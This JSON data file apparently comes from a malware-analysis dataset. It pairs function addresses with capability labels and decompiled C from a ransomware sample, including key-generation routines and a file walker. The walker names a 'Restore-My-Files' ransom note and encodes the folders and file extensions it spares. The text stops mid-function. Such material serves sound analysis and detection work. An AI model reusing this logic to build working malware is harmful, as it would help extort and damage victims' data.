{
    "null": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "0040d760": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040d760(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    \n    uVar3 = *(arg_8h + 4);\n    iVar4 = arg_8h + 8;\n    uVar1 = fcn.0040ca50(iVar4);\n    if ((uVar3 == uVar1) && (uVar3 < 0x401)) {\n        iVar2 = fcn.0040a470(iVar4, 0);\n        if (0 < iVar2) {\n            iVar2 = fcn.0040ba70(iVar4, 0);\n            if (iVar2 != 0) {\n                arg_8h = arg_8h + 0x14;\n                iVar2 = fcn.0040a470(arg_8h, 0);\n                if (0 < iVar2) {\n                    uVar3 = fcn.0040a370(iVar4);\n                    if (0x7f < uVar3) {\n                        iVar2 = fcn.0040ba70(arg_8h, 0);\n                        if (iVar2 != 0) {\n                            uVar3 = fcn.0040a370(arg_8h);\n                            if (1 < uVar3) {\n                                iVar4 = fcn.0040a4b0(arg_8h, iVar4);\n                                if (iVar4 < 0) {\n                                    return 0;\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n    return 0xffffbe00;\n}\n",
        "token_count": 361
    },
    "0040da70": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040da70(int32_t arg_8h, uint arg_ch, uint arg_10h, uint32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int32_t arg_8h_01;\n    uint var_30h;\n    uint var_24h;\n    int32_t var_18h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    if (((arg_14h < 0x80) || (arg_18h < 3)) || ((arg_14h & 1) != 0)) {\n        return -0x4080;\n    }\n    var_4h = -(0x400 < arg_14h) & 2;\n    fcn.0040bb10(&var_18h);\n    fcn.0040bb10(&var_24h);\n    fcn.0040bb10(&var_30h);\n    var_ch = arg_8h + 0x14;\n    iVar1 = fcn.0040c220(var_ch, arg_18h);\n    if (iVar1 == 0) {\n        var_8h = arg_14h >> 1;\n        arg_8h_00 = arg_8h + 0x2c;\n        iVar1 = fcn.0040b6c0(arg_8h_00, var_8h, var_4h, arg_ch, arg_10h);\n        if (iVar1 == 0) {\n            arg_8h_01 = arg_8h + 0x38;\n            do {\n                iVar1 = fcn.0040b6c0(arg_8h_01, var_8h, var_4h, arg_ch, arg_10h);\n                if ((iVar1 != 0) || (iVar1 = fcn.0040cb80(&var_18h, arg_8h_00, arg_8h_01),  iVar1 != 0)) break;\n                uVar2 = fcn.0040a370(&var_18h);\n                uVar4 = var_8h - 99;\n                if (arg_14h < 200) {\n                    uVar4 = 0;\n                }\n                if (uVar4 < uVar2) {\n                    if (var_18h < 0) {\n                        fcn.0040cbf0(arg_8h_00, arg_8h_01);\n                    }\n                    iVar1 = fcn.0040cb40(arg_8h_00, arg_8h_00, 1);\n                    if (((iVar1 != 0) || (iVar1 = fcn.0040cb40(arg_8h_01, arg_8h_01, 1),  iVar1 != 0)) ||\n                       ((iVar1 = fcn.0040c540(&var_18h, arg_8h_00, arg_8h_01),  iVar1 != 0 ||\n                        (iVar1 = fcn.0040b450(&var_24h, var_ch, &var_18h),  iVar1 != 0)))) break;\n                    iVar1 = fcn.0040a470(&var_24h, 1);\n                    if (iVar1 == 0) {\n                        iVar1 = fcn.0040b450(&var_24h, arg_8h_00, arg_8h_01);\n                        if (((iVar1 != 0) || (iVar1 = fcn.0040a670(&var_30h, 0, &var_18h, &var_24h),  iVar1 != 0)) ||\n                           (iVar1 = fcn.0040bb30(arg_8h + 0x20, var_ch, &var_30h),  iVar1 != 0)) break;\n                        uVar2 = fcn.0040a370(arg_8h + 0x20);\n                        if (arg_14h + 1 >> 1 < uVar2) {\n                            iVar1 = fcn.0040a2c0(arg_8h_00, arg_8h_00, 1);\n                            if (((iVar1 == 0) && (iVar1 = fcn.0040a2c0(arg_8h_01, arg_8h_01, 1),  iVar1 == 0)) &&\n                               (iVar1 = fcn.0040c540(arg_8h + 8, arg_8h_00, arg_8h_01),  iVar1 == 0)) {\n                                uVar3 = fcn.0040ca50(arg_8h + 8);\n                                *(arg_8h + 4) = uVar3;\n                                iVar1 = fcn.0040ef30(arg_8h_00, arg_8h_01, arg_8h + 0x20, arg_8h + 0x44, arg_8h + 0x50, \n                                                     arg_8h + 0x5c);\n                                if (iVar1 == 0) {\n                                    iVar1 = fcn.0040d6e0(arg_8h);\n                                }\n                            }\n                            break;\n                        }\n                    }\n                }\n                iVar1 = fcn.0040b6c0(arg_8h_00, var_8h, var_4h, arg_ch, arg_10h);\n            } while (iVar1 == 0);\n        }\n    }\n    fcn.0040b400(&var_18h);\n    fcn.0040b400(&var_24h);\n    fcn.0040b400(&var_30h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    fcn.0040d9d0(arg_8h);\n    return iVar1 + -0x4180;\n}\n",
        "token_count": 1336
    },
    "00407e50": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00407e50(int16_t *arg_8h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int16_t *piVar6;\n    uint32_t uVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint *puVar10;\n    code *pcVar11;\n    uint pszPath;\n    uint lpFileName;\n    uint var_76ch;\n    uint lpFindFileData;\n    uint lpString;\n    uint var_454h;\n    uint var_450h;\n    uint var_44ch;\n    uint var_448h;\n    uint var_444h;\n    uint var_440h;\n    uint var_43ch;\n    uint var_438h;\n    uint var_434h;\n    uint var_430h;\n    uint var_42ch;\n    uint var_428h;\n    uint var_424h;\n    uint var_420h;\n    uint var_41ch;\n    uint var_418h;\n    uint var_414h;\n    uint var_410h;\n    uint var_40ch;\n    uint var_408h;\n    uint var_404h;\n    uint var_400h;\n    uint var_3fch;\n    uint var_3f8h;\n    uint var_3f4h;\n    uint var_3f0h;\n    uint var_3ech;\n    uint var_3e8h;\n    uint var_3e4h;\n    uint var_3e0h;\n    uint var_3dch;\n    uint var_3d8h;\n    uint var_3d4h;\n    uint var_3d0h;\n    uint var_3cch;\n    uint var_3c8h;\n    uint var_3c4h;\n    uint var_3c0h;\n    uint var_3bch;\n    uint var_3b8h;\n    uint var_3b4h;\n    uint var_3b0h;\n    uint var_3ach;\n    uint var_3a8h;\n    uint var_3a4h;\n    uint var_3a0h;\n    uint var_39ch;\n    uint var_398h;\n    uint var_394h;\n    uint var_390h;\n    uint var_38ch;\n    uint var_388h;\n    uint var_384h;\n    uint var_380h;\n    uint var_37ch;\n    uint var_378h;\n    uint var_374h;\n    uint var_370h;\n    uint var_36ch;\n    uint var_368h;\n    uint var_364h;\n    uint var_360h;\n    uint var_35ch;\n    uint var_358h;\n    uint var_354h;\n    uint var_350h;\n    uint var_34ch;\n    uint var_348h;\n    uint var_344h;\n    uint var_340h;\n    uint var_33ch;\n    uint var_338h;\n    uint var_334h;\n    uint var_330h;\n    uint var_32ch;\n    uint var_328h;\n    uint var_324h;\n    uint var_320h;\n    uint var_31ch;\n    uint var_318h;\n    uint var_314h;\n    uint var_310h;\n    uint var_30ch;\n    uint var_308h;\n    uint var_304h;\n    uint var_300h;\n    uint var_2fch;\n    uint var_2f8h;\n    uint var_2f4h;\n    uint var_2f0h;\n    uint var_2ech;\n    uint var_2e8h;\n    uint var_2e4h;\n    uint var_2e0h;\n    uint var_2dch;\n    uint var_2d8h;\n    uint var_2d4h;\n    uint var_2d0h;\n    uint var_2cch;\n    uint var_2c8h;\n    uint var_2c4h;\n    uint var_2c0h;\n    uint var_2bch;\n    uint var_2b8h;\n    uint var_2b4h;\n    uint var_2b0h;\n    uint var_2ach;\n    uint var_2a8h;\n    uint var_2a4h;\n    uint var_2a0h;\n    uint var_29ch;\n    uint var_298h;\n    uint var_294h;\n    uint var_290h;\n    uint var_28ch;\n    uint var_288h;\n    uint var_284h;\n    uint var_280h;\n    uint var_27ch;\n    uint var_278h;\n    uint var_274h;\n    uint var_270h;\n    uint var_26ch;\n    uint var_268h;\n    uint var_264h;\n    uint var_260h;\n    uint var_25ch;\n    uint var_258h;\n    uint var_254h;\n    uint var_250h;\n    uint var_24ch;\n    uint var_248h;\n    uint var_244h;\n    uint var_240h;\n    uint var_23ch;\n    uint var_238h;\n    uint var_234h;\n    uint var_230h;\n    uint var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    uint ARG_1;\n    uint var_218h;\n    uint var_214h;\n    uint var_210h;\n    uint var_20ch;\n    uint var_208h;\n    uint var_204h;\n    uint var_200h;\n    uint var_1fch;\n    uint var_1f8h;\n    uint var_1f4h;\n    uint var_1f0h;\n    uint var_1ech;\n    uint var_1e8h;\n    uint var_1e4h;\n    uint var_1e0h;\n    uint var_1dch;\n    uint var_1d8h;\n    uint var_1d4h;\n    uint var_1d0h;\n    uint var_1cch;\n    uint var_1c8h;\n    uint var_1c4h;\n    uint var_1c0h;\n    uint var_1bch;\n    uint var_1b8h;\n    uint var_1b4h;\n    uint var_1b0h;\n    uint var_1ach;\n    uint var_1a8h;\n    uint var_1a4h;\n    uint var_1a0h;\n    uint var_19ch;\n    uint var_198h;\n    uint var_194h;\n    uint var_190h;\n    uint var_18ch;\n    uint var_188h;\n    uint var_184h;\n    uint var_180h;\n    uint var_17ch;\n    uint var_178h;\n    uint var_174h;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.USER32.dll_wsprintfW;\n    var_1ch._0_2_ = 0;\n    var_24h = 0x730025;\n    var_20h = 0x2a005c;\n    (*_sym.imp.USER32.dll_wsprintfW)(&lpFileName, &var_24h, arg_8h);\n    iVar3 = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(&lpFileName, &lpFindFileData);\n    if (iVar3 != -1) {\n        var_388h = 0x770024;\n        var_384h = 0x6e0069;\n        var_380h = 0x6f0064;\n        var_37ch = 0x730077;\n        var_378h = 0x7e002e;\n        var_374h = 0x740062;\n        var_370h._0_2_ = 0;\n        var_210h = 0x6e0069;\n        var_20ch = 0x650074;\n        var_208h = 0x6c;\n        var_2c0h = 0x73006d;\n        var_2bch = 0x63006f;\n        var_2b8h = 0x630061;\n        var_2b4h = 0x650068;\n        var_2b0h._0_2_ = 0;\n        var_3a4h = 0x720024;\n        var_3a0h = 0x630065;\n        var_39ch = 0x630079;\n        var_398h = 0x65006c;\n        var_394h = 0x62002e;\n        var_390h = 0x6e0069;\n        var_38ch._0_2_ = 0;\n        var_3c0h = 0x770024;\n        var_3bch = 0x6e0069;\n        var_3b8h = 0x6f0064;\n        var_3b4h = 0x730077;\n        var_3b0h = 0x7e002e;\n        var_3ach = 0x730077;\n        var_3a8h._0_2_ = 0;\n        var_33ch = 0x6f0074;\n        var_338h = 0x200072;\n        var_334h = 0x720062;\n        var_330h = 0x77006f;\n        var_32ch = 0x650073;\n        var_328h = 0x72;\n        var_30h = 0x6f0062;\n        var_2ch = 0x74006f;\n        var_28h._0_2_ = 0;\n        var_454h = 0x790073;\n        var_450h = 0x740073;\n        var_44ch = 0x6d0065;\n        var_448h = 0x760020;\n        var_444h = 0x6c006f;\n        var_440h = 0x6d0075;\n        var_43ch = 0x200065;\n        var_438h = 0x6e0069;\n        var_434h = 0x6f0066;\n        var_430h = 0x6d0072;\n        var_42ch = 0x740061;\n        var_428h = 0x6f0069;\n        var_424h = 0x6e;\n        var_2d4h = 0x650070;\n        var_2d0h = 0x660072;\n        var_2cch = 0x6f006c;\n        var_2c8h = 0x730067;\n        var_2c4h._0_2_ = 0;\n        var_26ch = 0x6f0067;\n        var_268h = 0x67006f;\n        var_264h = 0x65006c;\n        var_260h._0_2_ = 0;\n        var_420h = 0x700061;\n        var_41ch = 0x6c0070;\n        var_418h = 0x630069;\n        var_414h = 0x740061;\n        var_410h = 0x6f0069;\n        var_40ch = 0x20006e;\n        var_408h = 0x610064;\n        var_404h = 0x610074;\n        var_400h._0_2_ = 0;\n        var_28ch = 0x690077;\n        var_288h = 0x64006e;\n        var_284h = 0x77006f;\n        var_280h = 0x73;\n        var_354h = 0x690077;\n        var_350h = 0x64006e;\n        var_34ch = 0x77006f;\n        var_348h = 0x2e0073;\n        var_344h = 0x6c006f;\n        var_340h = 100;\n        var_29ch = 0x700061;\n        var_298h = 0x640070;\n        var_294h = 0x740061;\n        var_290h = 0x61;\n        var_2ach = 0x6f006d;\n        var_2a8h = 0x69007a;\n        var_2a4h = 0x6c006c;\n        var_2a0h = 0x61;\n        var_24ch = 0x74006e;\n        var_248h = 0x64006c;\n        var_244h = 0x72;\n        var_3fch = 0x74006e;\n        var_3f8h = 0x730075;\n        var_3f4h = 0x720065;\n        var_3f0h = 0x64002e;\n        var_3ech = 0x740061;\n        var_3e8h = 0x6c002e;\n        var_3e4h = 0x67006f;\n        var_3e0h._0_2_ = 0;\n        var_3dch = 0x6f0062;\n        var_3d8h = 0x74006f;\n        var_3d4h = 0x650073;\n        var_3d0h = 0x740063;\n        var_3cch = 0x62002e;\n        var_3c8h = 0x6b0061;\n        var_3c4h._0_2_ = 0;\n        var_36ch = 0x750061;\n        var_368h = 0x6f0074;\n        var_364h = 0x750072;\n        var_360h = 0x2e006e;\n        var_35ch = 0x6e0069;\n        var_358h = 0x66;\n        var_4h = 0x2e;\n        var_10h = 0x2e002e;\n        var_ch._0_2_ = 0;\n        ARG_1 = 0x730025;\n        var_218h = 0x25005c;\n        var_214h = 0x73;\n        var_3ch = 0x33002e;\n        var_38h = 0x360038;\n        var_34h._0_2_ = 0;\n        var_48h = 0x63002e;\n        var_44h = 0x64006d;\n        var_40h._0_2_ = 0;\n        var_54h = 0x61002e;\n        var_50h = 0x69006e;\n        var_4ch._0_2_ = 0;\n        var_60h = 0x61002e;\n        var_5ch = 0x760064;\n        var_58h._0_2_ = 0;\n        var_27ch = 0x74002e;\n        var_278h = 0x650068;\n        var_274h = 0x65006d;\n        var_270h._0_2_ = 0;\n        var_6ch = 0x6d002e;\n        var_68h = 0x690073;\n        var_64h._0_2_ = 0;\n        var_78h = 0x6d002e;\n        var_74h = 0x700073;\n        var_70h._0_2_ = 0;\n        var_84h = 0x63002e;\n        var_80h = 0x6d006f;\n        var_7ch._0_2_ = 0;\n        var_2e8h = 0x64002e;\n        var_2e4h = 0x610069;\n        var_2e0h = 0x700067;\n        var_2dch = 0x67006b;\n        var_2d8h._0_2_ = 0;\n        var_90h = 0x6e002e;\n        var_8ch = 0x73006c;\n        var_88h._0_2_ = 0;\n        var_2fch = 0x64002e;\n        var_2f8h = 0x610069;\n        var_2f4h = 0x630067;\n        var_2f0h = 0x620061;\n        var_2ech._0_2_ = 0;\n        var_234h = 0x6c002e;\n        var_230h = 0x63006f;\n        var_22ch = 0x6b;\n        var_9ch = 0x6f002e;\n        var_98h = 0x780063;\n        var_94h._0_2_ = 0;\n        var_a8h = 0x6d002e;\n        var_a4h = 0x610070;\n        var_a0h._0_2_ = 0;\n        var_b4h = 0x63002e;\n        var_b0h = 0x6c0070;\n        var_ach._0_2_ = 0;\n        var_c0h = 0x6d002e;\n        var_bch = 0x64006f;\n        var_b8h._0_2_ = 0;\n        var_cch = 0x68002e;\n        var_c8h = 0x610074;\n        var_c4h._0_2_ = 0;\n        var_240h = 0x69002e;\n        var_23ch = 0x6e0063;\n        var_238h = 0x73;\n        var_d8h = 0x70002e;\n        var_d4h = 0x660072;\n        var_d0h._0_2_ = 0;\n        var_e4h = 0x72002e;\n        var_e0h = 0x700074;\n        var_dch._0_2_ = 0;\n        var_310h = 0x64002e;\n        var_30ch = 0x610069;\n        var_308h = 0x630067;\n        var_304h = 0x670066;\n        var_300h._0_2_ = 0;\n        var_324h = 0x6d002e;\n        var_320h = 0x730073;\n        var_31ch = 0x790074;\n        var_318h = 0x65006c;\n        var_314h = 0x73;\n        var_f0h = 0x62002e;\n        var_ech = 0x6e0069;\n        var_e8h._0_2_ = 0;\n        var_fch = 0x68002e;\n        var_f8h = 0x70006c;\n        var_f4h._0_2_ = 0;\n        var_108h = 0x73002e;\n        var_104h = 0x730068;\n        var_100h._0_2_ = 0;\n        var_114h = 0x64002e;\n        var_110h = 0x760072;\n        var_10ch._0_2_ = 0;\n        var_120h = 0x77002e;\n        var_11ch = 0x780070;\n        var_118h._0_2_ = 0;\n        var_12ch = 0x62002e;\n        var_128h = 0x740061;\n        var_124h._0_2_ = 0;\n        var_138h = 0x72002e;\n        var_134h = 0x6d006f;\n        var_130h._0_2_ = 0;\n        var_144h = 0x6d002e;\n        var_140h = 0x630073;\n        var_13ch._0_2_ = 0;\n        var_150h = 0x73002e;\n        var_14ch = 0x6c0070;\n        var_148h._0_2_ = 0;\n        var_15ch = 0x70002e;\n        var_158h = 0x310073;\n        var_154h._0_2_ = 0;\n        var_168h = 0x6d002e;\n        var_164h = 0x750073;\n        var_160h._0_2_ = 0;\n        var_174h = 0x69002e;\n        var_170h = 0x730063;\n        var_16ch._0_2_ = 0;\n        var_180h = 0x6b002e;\n        var_17ch = 0x790065;\n        var_178h._0_2_ = 0;\n        var_228h = 0x61002e;\n        var_224h = 0x630062;\n        var_220h = 100;\n        var_1a4h = 0x65002e;\n        var_1a0h = 0x650078;\n        var_19ch._0_2_ = 0;\n        var_1b0h = 0x64002e;\n        var_1ach = 0x6c006c;\n        var_1a8h._0_2_ = 0;\n        var_1bch = 0x63002e;\n        var_1b4h._0_2_ = 0;\n        var_1fch._0_2_ = 0;\n        var_1f0h._0_2_ = 0;\n        var_1e4h._0_2_ = 0;\n        var_1d8h._0_2_ = 0;\n        var_1cch._0_2_ = 0;\n        var_1c0h._0_2_ = 0;\n        var_190h._0_2_ = 0;\n        var_184h._0_2_ = 0;\n        var_250h._0_2_ = 0;\n        var_1b8h = 0x620061;\n        var_204h = 0x6c002e;\n        var_200h = 0x6b006e;\n        var_1f8h = 0x69002e;\n        var_1f4h = 0x6f0063;\n        var_1ech = 0x68002e;\n        var_1e8h = 0x70006c;\n        var_1e0h = 0x73002e;\n        var_1dch = 0x730079;\n        var_1d4h = 0x69002e;\n        var_1d0h = 0x780064;\n        var_1c8h = 0x69002e;\n        var_1c4h = 0x69006e;\n        var_198h = 0x72002e;\n        var_194h = 0x670065;\n        var_18ch = 0x6d002e;\n        var_188h = 0x330070;\n        var_18h = 0x64002e;\n        var_14h = 0x62;\n        var_25ch = 0x530025;\n        var_258h = 0x74002e;\n        var_254h = 0x740078;\n        var_8h = iVar3;\n        (*pcVar2)(&var_76ch, &var_25ch, \"Restore-My-Files\");\n        pcVar2 = _sym.imp.KERNEL32.dll_lstrcmpiW;\n        pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW;\n        do {\n            if ((var_4h != lpString) && (var_10h != lpString)) {\n                if ((lpFindFileData & 0x10) == 0) {\n                    iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenW)(&lpString);\n                    if (4 < iVar4) {\n                        uVar5 = (*_sym.imp.SHLWAPI.dll_PathFindExtensionW)(&lpString);\n                        iVar4 = (*pcVar2)(&var_3ch, uVar5);\n                        pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW;\n                        if (((((iVar4 != 0) &&\n                              (iVar4 = (*pcVar2)(&var_48h, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                              iVar4 != 0)) &&\n                             (iVar4 = (*pcVar2)(&var_228h, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                             iVar4 != 0)) &&\n                            (((((((iVar4 = (*pcVar2)(&var_54h, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                                  iVar4 != 0 &&\n                                  (iVar4 = (*pcVar2)(&var_60h, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                                  iVar4 != 0)) &&\n                                 ((iVar4 = (*pcVar2)(&var_27ch, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                                  iVar4 != 0 &&\n                                  ((iVar4 = (*pcVar2)(&var_6ch, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                                   iVar4 != 0 &&\n                                   (iVar4 = (*pcVar2)(&var_78h, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                                   iVar4 != 0)))))) &&\n                                (iVar4 = (*pcVar2)(&var_84h, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                                iVar4 != 0)) &&\n                               ((((iVar4 = (*pcVar2)(&var_2e8h, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                                  iVar4 != 0 &&\n                                  (iVar4 = (*pcVar2)(&var_90h, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                                  iVar4 != 0)) &&\n                                 (iVar4 = (*pcVar2)(&var_2fch, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                                 iVar4 != 0)) &&\n                                ((iVar4 = (*pcVar2)(&var_234h, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                                 iVar4 != 0 &&\n                                 (iVar4 = (*pcVar2)(&var_9ch, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                                 iVar4 != 0)))))) &&\n                              ((((iVar4 = (*pcVar2)(&var_a8h, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                                 iVar4 != 0 &&\n                                 ((iVar4 = (*pcVar2)(&var_b4h, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                                  iVar4 != 0 &&\n                                  (iVar4 = (*pcVar2)(&var_c0h, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                                  iVar4 != 0)))) &&\n                                (iVar4 = (*pcVar2)(&var_cch, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                                iVar4 != 0)) &&\n                               (((((iVar4 = (*pcVar2)(&var_240h, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW\n                                   ,  iVar4 != 0 &&\n                                   (iVar4 = (*pcVar2)(&var_d8h, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                                   iVar4 != 0)) &&\n                                  (iVar4 = (*pcVar2)(&var_e4h, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                                  iVar4 != 0)) &&\n                                 ((iVar4 = (*pcVar2)(&var_310h, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                                  iVar4 != 0 &&\n                                  (iVar4 = (*pcVar2)(&var_324h, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                                  iVar4 != 0)))) &&\n                                (((iVar4 = (*pcVar2)(&var_f0h, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                                  iVar4 != 0 &&\n                                  ((iVar4 = (*pcVar2)(&var_fch, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                                   iVar4 != 0 &&\n                                   (iVar4 = (*pcVar2)(&var_108h, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW\n                                   ,  iVar4 != 0)))) &&\n                                 ((iVar4 = (*pcVar2)(&var_114h, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                                  iVar4 != 0 &&\n                                  (((iVar4 = (*pcVar2)(&var_120h, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW\n                                    ,  iVar4 != 0 &&\n                                    (iVar4 = (*pcVar2)(&var_12ch, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW\n                                    ,  iVar4 != 0)) &&\n                                   (iVar4 = (*pcVar2)(&var_138h, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW\n                                   ,  iVar4 != 0)))))))))))) &&\n                             (((iVar4 = (*pcVar2)(&var_144h, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                               iVar4 != 0 &&\n                               (iVar4 = (*pcVar2)(&var_150h, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                               iVar4 != 0)) &&\n                              ((iVar4 = (*pcVar2)(&var_15ch, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                               iVar4 != 0 &&\n                               ((iVar4 = (*pcVar2)(&var_168h, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                                iVar4 != 0 &&\n                                (iVar4 = (*pcVar2)(&var_174h, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                                iVar4 != 0)))))))))) &&\n                           ((((iVar4 = (*pcVar2)(&var_180h, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                              iVar4 != 0 &&\n                              (((((iVar4 = (*pcVar2)(&var_18h, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                                  iVar4 != 0 &&\n                                  (iVar4 = (*pcVar2)(&var_18ch, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                                  iVar4 != 0)) &&\n                                 (iVar4 = (*pcVar2)(&var_198h, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                                 iVar4 != 0)) &&\n                                ((iVar4 = (*pcVar2)(&var_1a4h, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                                 iVar4 != 0 &&\n                                 (iVar4 = (*pcVar2)(&var_1b0h, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                                 iVar4 != 0)))) &&\n                               ((iVar4 = (*pcVar2)(&var_1bch, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                                iVar4 != 0 &&\n                                ((iVar4 = (*pcVar2)(&var_1c8h, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                                 iVar4 != 0 &&\n                                 (iVar4 = (*pcVar2)(&var_1d4h, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                                 iVar4 != 0)))))))) &&\n                             ((iVar4 = (*pcVar2)(&var_1e0h, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                              iVar4 != 0 &&\n                              (((iVar4 = (*pcVar2)(&var_1ech, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                                iVar4 != 0 &&\n                                (iVar4 = (*pcVar2)(&var_1f8h, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                                iVar4 != 0)) &&\n                               (iVar4 = (*pcVar2)(&var_204h, uVar5),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                               iVar4 != 0)))))) &&\n                            (((iVar4 = (*pcVar2)(&var_76ch, &lpString),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                              iVar4 != 0 &&\n                              (iVar4 = (*pcVar2)(&var_24ch, &lpString),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                              iVar4 != 0)) &&\n                             ((iVar4 = (*pcVar2)(&var_3fch, &lpString),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW, \n                              iVar4 != 0 &&\n                              